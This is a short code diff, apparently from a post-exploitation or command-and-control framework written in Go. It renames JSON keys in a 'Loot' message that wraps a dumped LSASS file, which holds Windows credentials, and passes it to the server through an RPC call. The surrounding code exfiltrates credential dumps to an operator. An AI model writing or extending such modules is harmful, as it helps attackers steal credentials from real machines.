@@ -147,7 +147,7 @@ func server(data modulescommon.ModuleCom) string {
 			AgentKey:   data.AgentKey,
 			ModuleName: data.ModuleName,
 			OutputType: "Loot",
-			Output:     []byte("{\"Type\":\"LSASS\", \"Data\":" + string(lsassFile) + "}"),
+			Output:     []byte("{\"type\":\"LSASS\", \"data\":" + string(lsassFile) + "}"),
 		}
 
 		client.Call("ModData.ModSendData", &LootLSASSmsg, &reply)
